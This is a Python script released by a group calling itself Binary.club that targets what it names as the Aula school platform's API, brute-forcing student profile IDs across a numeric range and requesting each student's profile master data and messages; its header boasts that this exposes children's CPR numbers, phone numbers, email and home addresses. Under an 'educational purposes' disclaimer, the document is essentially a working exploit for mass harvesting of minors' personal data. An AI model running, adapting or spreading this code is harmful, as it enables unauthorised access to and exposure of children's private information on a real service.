"""

  ____  _                              _       _     
 |  _ \(_)                            | |     | |    
 | |_) |_ _ __   __ _ _ __ _   _   ___| |_   _| |__  
 |  _ <| | '_ \ / _` | '__| | | | / __| | | | | '_ \ 
 | |_) | | | | | (_| | |  | |_| || (__| | |_| | |_) |
 |____/|_|_| |_|\__,_|_|   \__, (_)___|_|\__,_|_.__/ 
                            __/ |                    
                           |___/                      

~ Binary club
We are publishing this code for educational purposes only and to circumvent Kombit A/S Breaking multiple-laws, GDPR and other privacy regulations.
We are not responsible for any misuse of this code.

This Issue has been reported to the Kombit A/S team but no response has been received, Therefor we demand that you do not use this code for any illegal purposes.
These Feuteres are not allowed to be used in any illegal way.
Exposing Children SSN Numbers: (Social Security Number) or Better known as CPR numbers in Denmark.
Exposing Phone Numbers
Exposing Email Addresses
Exposing Home Addresses
______________________________________________________________________________________________________________

Project by Wrec & H4xton ~ The Binary.club team is a collective of Danish researches and hackers aged between 7-12 Years old. 

"""

import requests

# Here we define our Class
class Aula:

    def ReceiveStudenInformation(StudentID):

        # We Send our Request to the server.
        res = requests.get(f"https://www.aula.dk/api/v12/?method=profiles.getProfileMasterData&instProfileIds[]={StudentID}&fromAdministration=false")

        # We get the response.
        print(res.text)


    def ScrapeAula():

        # We define our ID Bruteforcer.
        for StudentID in range(100000, 999999):

            # Here we parse our guesed Student ID into our url and sends the request.
            res = requests.get(f"https://www.aula.dk/api/v12/?method=profiles.getProfileMasterData&instProfileIds[]={StudentID}&fromAdministration=true")

            # We get the response and check the status code.
            if res.status_code == 200:
                print(f"{StudentID} ~ Is a valid ID and is being used by a student")

            else:
                print(f"{StudentID} ~ Is not a valid ID")


    def ScrapeMessages(StudentID):

        # We define our request.
        res = requests.get(f"https://www.aula.dk/api/v12/?method=messages.getMessages&instProfileIds[]={StudentID}&fromAdministration=false")

        # We get the response.
        print(res.text)
